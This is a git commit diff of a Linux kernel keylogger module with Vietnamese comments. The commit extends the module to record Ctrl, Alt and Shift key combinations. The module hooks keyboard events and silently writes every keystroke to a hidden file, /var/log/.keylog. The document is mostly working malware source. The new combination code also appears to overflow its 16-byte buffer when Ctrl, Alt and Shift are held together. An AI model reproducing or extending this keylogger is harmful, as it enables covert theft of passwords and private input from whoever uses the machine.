2978c50ded5ddaf3699e98d27100d3044d5be3d1
Ducanh271 <nguyenduca03@gmail.com>
2025-07-03 21:57:34 +0700

    ver5 da co cac phim to hop, tam xong

--- keylogger_chrdev.c
+++ keylogger_chrdev.c
@@ -18,7 +18,7 @@
 #define DEVICE_NAME "keylogger"
 #define BUF_SIZE 1024
 #define LOG_PATH "/var/log/.keylog"
-#define MAX_PENDING_CHARS 6 // Đủ dài cho chuỗi như [BACKSPACE]
+#define MAX_PENDING_CHARS 16 // Đủ dài cho tổ hợp phím như [Ctrl+Alt+Del]
 
 static dev_t dev_num;
 static struct cdev keylogger_cdev;
@@ -30,11 +30,16 @@ static DEFINE_SPINLOCK(buf_lock);
 static DECLARE_WAIT_QUEUE_HEAD(keylogger_wq);
 
 static struct work_struct keylogger_work;
-static char pending_key[MAX_PENDING_CHARS]; // Mảng để lưu chuỗi đặc biệt
+static char pending_key[MAX_PENDING_CHARS];
 static int pending_count = 0;
 static struct file *log_file;
 
-static bool shift_pressed = false;
+static bool left_shift_pressed = false;
+static bool right_shift_pressed = false;
+static bool left_ctrl_pressed = false;
+static bool right_ctrl_pressed = false;
+static bool left_alt_pressed = false;
+static bool right_alt_pressed = false;
 static bool caps_lock_active = false;
 
 struct key_map {
@@ -42,38 +47,92 @@ struct key_map {
     const char *special; // Chuỗi đặc biệt cho phím không có ký tự ASCII
     char normal;
     char shifted;
+    char combo_char; // Ký tự dùng trong tổ hợp phím
 };
 
 static const struct key_map keymap[] = {
-    {KEY_1, NULL, '1', '!'}, {KEY_2, NULL, '2', '@'}, {KEY_3, NULL, '3', '#'}, {KEY_4, NULL, '4', '$'},
-    {KEY_5, NULL, '5', '%'}, {KEY_6, NULL, '6', '^'}, {KEY_7, NULL, '7', '&'}, {KEY_8, NULL, '8', '*'},
-    {KEY_9, NULL, '9', '('}, {KEY_0, NULL, '0', ')'}, {KEY_MINUS, NULL, '-', '_'}, {KEY_EQUAL, NULL, '=', '+'},
-    {KEY_TAB, NULL, '\t', '\t'}, {KEY_Q, NULL, 'q', 'Q'}, {KEY_W, NULL, 'w', 'W'}, {KEY_E, NULL, 'e', 'E'},
-    {KEY_R, NULL, 'r', 'R'}, {KEY_T, NULL, 't', 'T'}, {KEY_Y, NULL, 'y', 'Y'}, {KEY_U, NULL, 'u', 'U'},
-    {KEY_I, NULL, 'i', 'I'}, {KEY_O, NULL, 'o', 'O'}, {KEY_P, NULL, 'p', 'P'}, {KEY_LEFTBRACE, NULL, '[', '{'},
-    {KEY_RIGHTBRACE, NULL, ']', '}'}, {KEY_ENTER, NULL, '\n', '\n'}, {KEY_A, NULL, 'a', 'A'}, {KEY_S, NULL, 's', 'S'},
-    {KEY_D, NULL, 'd', 'D'}, {KEY_F, NULL, 'f', 'F'}, {KEY_G, NULL, 'g', 'G'}, {KEY_H, NULL, 'h', 'H'},
-    {KEY_J, NULL, 'j', 'J'}, {KEY_K, NULL, 'k', 'K'}, {KEY_L, NULL, 'l', 'L'}, {KEY_SEMICOLON, NULL, ';', ':'},
-    {KEY_APOSTROPHE, NULL, '\'', '"'}, {KEY_BACKSLASH, NULL, '\\', '|'}, {KEY_Z, NULL, 'z', 'Z'},
-    {KEY_X, NULL, 'x', 'X'}, {KEY_C, NULL, 'c', 'C'}, {KEY_V, NULL, 'v', 'V'}, {KEY_B, NULL, 'b', 'B'},
-    {KEY_N, NULL, 'n', 'N'}, {KEY_M, NULL, 'm', 'M'}, {KEY_COMMA, NULL, ',', '<'}, {KEY_DOT, NULL, '.', '>'},
-    {KEY_SLASH, NULL, '/', '?'}, {KEY_SPACE, NULL, ' ', ' '},
+    {KEY_1, NULL, '1', '!', '1'}, {KEY_2, NULL, '2', '@', '2'}, {KEY_3, NULL, '3', '#', '3'}, {KEY_4, NULL, '4', '$', '4'},
+    {KEY_5, NULL, '5', '%', '5'}, {KEY_6, NULL, '6', '^', '6'}, {KEY_7, NULL, '7', '&', '7'}, {KEY_8, NULL, '8', '*', '8'},
+    {KEY_9, NULL, '9', '(', '9'}, {KEY_0, NULL, '0', ')', '0'}, {KEY_MINUS, NULL, '-', '_', '-'}, {KEY_EQUAL, NULL, '=', '+', '='},
+    {KEY_TAB, "[TAB]", 0, 0, 0}, {KEY_Q, NULL, 'q', 'Q', 'Q'}, {KEY_W, NULL, 'w', 'W', 'W'}, {KEY_E, NULL, 'e', 'E', 'E'},
+    {KEY_R, NULL, 'r', 'R', 'R'}, {KEY_T, NULL, 't', 'T', 'T'}, {KEY_Y, NULL, 'y', 'Y', 'Y'}, {KEY_U, NULL, 'u', 'U', 'U'},
+    {KEY_I, NULL, 'i', 'I', 'I'}, {KEY_O, NULL, 'o', 'O', 'O'}, {KEY_P, NULL, 'p', 'P', 'P'}, {KEY_LEFTBRACE, NULL, '[', '{', '['},
+    {KEY_RIGHTBRACE, NULL, ']', '}', ']'}, {KEY_ENTER, NULL, '\n', '\n', '\n'}, {KEY_A, NULL, 'a', 'A', 'A'}, {KEY_S, NULL, 's', 'S', 'S'},
+    {KEY_D, NULL, 'd', 'D', 'D'}, {KEY_F, NULL, 'f', 'F', 'F'}, {KEY_G, NULL, 'g', 'G', 'G'}, {KEY_H, NULL, 'h', 'H', 'H'},
+    {KEY_J, NULL, 'j', 'J', 'J'}, {KEY_K, NULL, 'k', 'K', 'K'}, {KEY_L, NULL, 'l', 'L', 'L'}, {KEY_SEMICOLON, NULL, ';', ':', ';'},
+    {KEY_APOSTROPHE, NULL, '\'', '"', '\''}, {KEY_BACKSLASH, NULL, '\\', '|', '\\'}, {KEY_Z, NULL, 'z', 'Z', 'Z'},
+    {KEY_X, NULL, 'x', 'X', 'X'}, {KEY_C, NULL, 'c', 'C', 'C'}, {KEY_V, NULL, 'v', 'V', 'V'}, {KEY_B, NULL, 'b', 'B', 'B'},
+    {KEY_N, NULL, 'n', 'N', 'N'}, {KEY_M, NULL, 'm', 'M', 'M'}, {KEY_COMMA, NULL, ',', '<', ','}, {KEY_DOT, NULL, '.', '>', '.'},
+    {KEY_SLASH, NULL, '/', '?', '/'}, {KEY_SPACE, NULL, ' ', ' ', ' '},
     // Phím điều khiển
-    {KEY_BACKSPACE, "[BS]", 0, 0}, // Backspace
-    {KEY_DELETE, "[DEL]", 0, 0},       // Delete
-    {KEY_LEFTCTRL, "[CT]", 0, 0},       // Left Ctrl
-    {KEY_RIGHTCTRL, "[CT]", 0, 0},      // Right Ctrl
-    {KEY_UP, "[UP]", 0, 0},               // Up
-    {KEY_DOWN, "[D]", 0, 0},           // Down
-    {KEY_LEFT, "[L]", 0, 0},           // Left
-    {KEY_RIGHT, "[R]", 0, 0},         // Right
-    {0, NULL, 0, 0} // Kết thúc bảng
+    {KEY_BACKSPACE, "[BS]", 0, 0, 0}, // Backspace
+    {KEY_DELETE, "[DEL]", 0, 0, 0},   // Delete
+    {KEY_LEFTCTRL, "[CT]", 0, 0, 0},  // Left Ctrl
+    {KEY_RIGHTCTRL, "[CT]", 0, 0, 0}, // Right Ctrl
+    {KEY_LEFTALT, "[ALT]", 0, 0, 0},  // Left Alt
+    {KEY_RIGHTALT, "[ALT]", 0, 0, 0}, // Right Alt
+    {KEY_UP, "[UP]", 0, 0, 0},        // Up
+    {KEY_DOWN, "[D]", 0, 0, 0},       // Down
+    {KEY_LEFT, "[L]", 0, 0, 0},       // Left
+    {KEY_RIGHT, "[R]", 0, 0, 0},      // Right
+    {0, NULL, 0, 0, 0} // Kết thúc bảng
 };
 
 static void set_pending_key(int keycode) {
+    bool shift_pressed = left_shift_pressed || right_shift_pressed;
+    bool ctrl_pressed = left_ctrl_pressed || right_ctrl_pressed;
+    bool alt_pressed = left_alt_pressed || right_alt_pressed;
+    bool is_modifier = (keycode == KEY_LEFTSHIFT || keycode == KEY_RIGHTSHIFT ||
+                       keycode == KEY_LEFTCTRL || keycode == KEY_RIGHTCTRL ||
+                      keycode == KEY_LEFTALT || keycode == KEY_RIGHTALT ||
+                       keycode == KEY_CAPSLOCK);
+
+    // Không xử lý nếu là phím điều chỉnh
+    if (is_modifier) {
+        pending_count = 0;
+        return;
+    }
+
     for (int i = 0; keymap[i].keycode; i++) {
         if (keymap[i].keycode == keycode) {
-            if (keymap[i].special) {
+            bool is_letter = (keycode >= KEY_A && keycode <= KEY_Z);
+
+            // Xử lý tổ hợp phím nếu có Ctrl hoặc Alt
+            if (ctrl_pressed || alt_pressed) {
+                pending_count = 0;
+                pending_key[pending_count++] = '[';
+                if (ctrl_pressed) {
+                    pending_key[pending_count++] = 'C';
+                    pending_key[pending_count++] = 't';
+                    pending_key[pending_count++] = 'r';
+                    pending_key[pending_count++] = 'l';
+                    pending_key[pending_count++] = '+';
+                }
+                if (alt_pressed) {
+                    pending_key[pending_count++] = 'A';
+                    pending_key[pending_count++] = 'l';
+                    pending_key[pending_count++] = 't';
+                    pending_key[pending_count++] = '+';
+                }
+                if (shift_pressed && keymap[i].combo_char) {
+                    pending_key[pending_count++] = 'S';
+                    pending_key[pending_count++] = 'h';
+                    pending_key[pending_count++] = 'i';
+                    pending_key[pending_count++] = 'f';
+                    pending_key[pending_count++] = 't';
+                    pending_key[pending_count++] = '+';
+                }
+                if (keymap[i].combo_char) {
+                    pending_key[pending_count++] = keymap[i].combo_char;
+                } else if (keymap[i].special) {
+                    const char *special = keymap[i].special;
+                    while (*special && pending_count < MAX_PENDING_CHARS - 1) {
+                        pending_key[pending_count++] = *special++;
+                    }
+                }
+                pending_key[pending_count++] = ']';
+                pending_key[pending_count] = '\0';
+            } else if (keymap[i].special) {
                 // Ghi chuỗi đặc biệt
                 const char *special = keymap[i].special;
                 pending_count = 0;
@@ -82,12 +141,13 @@ static void set_pending_key(int keycode) {
                 }
                 pending_key[pending_count] = '\0';
             } else {
-                bool is_letter = (keycode >= KEY_A && keycode <= KEY_Z);
+                // Ghi ký tự thông thường, ưu tiên shifted nếu Shift được nhấn
                 bool use_shifted = shift_pressed ^ (is_letter && caps_lock_active);
                 char c = use_shifted ? keymap[i].shifted : keymap[i].normal;
                 if (c) {
                     pending_key[0] = c;
                     pending_count = 1;
+                    pending_key[pending_count] = '\0';
                 }
             }
             break;
@@ -114,31 +174,53 @@ static void keylogger_work_func(struct work_struct *work) {
     if (log_file) {
         loff_t pos = 0;
         for (int i = 0; i < pending_count; i++) {
-            printk(KERN_DEBUG "Writing to log: %c\n", pending_key[i]); // Debug log
+            printk(KERN_DEBUG "Writing to log: %c\n", pending_key[i]);
             ssize_t written = kernel_write(log_file, &pending_key[i], 1, &pos);
             if (written < 0) {
                 printk(KERN_ERR "Failed to write to log file: %ld\n", written);
             }
         }
-        vfs_fsync(log_file, 0); // Flush file
+        vfs_fsync(log_file, 0);
     }
-    pending_count = 0; // Reset queue
+    pending_count = 0;
 }
 
 static int keylogger_notifier(struct notifier_block *nb, unsigned long action, void *data) {
     struct keyboard_notifier_param *param = data;
 
-    printk(KERN_DEBUG "Notifier action: %lu, value: %d, down: %d\n", action, param->value, param->down); // Debug log
+    printk(KERN_DEBUG "Notifier action: %lu, value: %d, down: %d\n", action, param->value, param->down);
 
     if (action == KBD_KEYCODE) {
-        if (param->value == KEY_LEFTSHIFT || param->value == KEY_RIGHTSHIFT) {
-            shift_pressed = param->down;
+        // Cập nhật trạng thái phím điều chỉnh
+        if (param->value == KEY_LEFTSHIFT) {
+            left_shift_pressed = param->down;
+            return NOTIFY_OK;
+        }
+        if (param->value == KEY_RIGHTSHIFT) {
+            right_shift_pressed = param->down;
+            return NOTIFY_OK;
+        }
+        if (param->value == KEY_LEFTCTRL) {
+            left_ctrl_pressed = param->down;
+            return NOTIFY_OK;
+        }
+        if (param->value == KEY_RIGHTCTRL) {
+            right_ctrl_pressed = param->down;
+            return NOTIFY_OK;
+        }
+        if (param->value == KEY_LEFTALT) {
+            left_alt_pressed = param->down;
+            return NOTIFY_OK;
+        }
+        if (param->value == KEY_RIGHTALT) {
+            right_alt_pressed = param->down;
             return NOTIFY_OK;
         }
         if (param->value == KEY_CAPSLOCK && param->down) {
             caps_lock_active = !caps_lock_active;
             return NOTIFY_OK;
         }
+        // Xử lý phím thông thường khi nhấn
         if (param->down) {
             set_pending_key(param->value);
             if (pending_count > 0) {
@@ -255,5 +337,5 @@ module_init(keylogger_init);
 module_exit(keylogger_exit);
 
 MODULE_LICENSE("GPL");
-MODULE_AUTHOR("duckanh + ChatGPT");
-MODULE_DESCRIPTION("Safe keylogger using keyboard_notifier + char device + log file");
+MODULE_AUTHOR("duckanh + ChatGPT + Grok");
+MODULE_DESCRIPTION("Safe keylogger with keyboard_notifier, char device, log file, and key combination support"); 
